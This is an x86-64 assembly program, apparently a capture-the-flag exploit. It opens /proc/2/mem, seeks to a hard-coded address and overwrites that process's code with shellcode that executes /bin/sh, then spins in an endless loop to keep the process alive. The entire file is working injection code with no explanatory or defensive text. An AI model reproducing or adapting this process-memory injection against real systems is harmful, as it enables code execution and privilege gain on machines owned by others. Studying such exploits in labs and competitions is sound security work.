[bits 64]

; open file
mov rax,2 ; syscall
lea rdi, [rel filename] ; filename
mov rsi, 0x1 ; flag
mov rdx, 0; mode
syscall
;mov [rel tmp],rax
;call debug

mov rax, 8; lseek 
mov rdi, 3 ; fd
mov rsi, 0x40223a ;addr
mov rdx, 0; shit
syscall
;mov [rel tmp],rax
;call debug

;write
mov rax, 1
mov rdi, 3; fd
lea rsi, [rel fstart]
mov rdx, fend-fstart
syscall

loop:
jmp loop ; keep shit alive

fstart:
mov rax, 0x3b ; execv
lea rdi, [rel binsh] ; /bin/sh
mov rsi, 0 ; args
mov rdx, 0 ; env
syscall
binsh: db "/bin/sh", 0
fend:


debug:
mov eax, 1 ; syscall
mov rdi, 2 ; fd
lea rsi, [rel tmp]; address 0x48a0bc == ctf
mov rdx, 4 ; bytes
syscall
ret

filename: db "/proc/2/mem", 0
tmp: dq 0